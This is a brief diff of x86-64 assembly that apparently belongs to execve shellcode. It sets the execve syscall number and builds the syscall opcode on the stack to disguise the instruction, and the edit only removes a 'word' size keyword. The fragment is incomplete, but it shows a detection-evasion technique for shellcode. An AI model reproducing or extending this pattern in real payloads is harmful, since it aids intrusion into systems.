@@ -43,7 +43,7 @@ _realstart:
    mov rsi , rsp
    add al , 59
    xor r14 , r14
-   mov r14w , word 0x050f   ; opcode for syscall in reverse order
+   mov r14w ,  0x050f   ; opcode for syscall in reverse order
    push r14
    push rsp
    pop r14
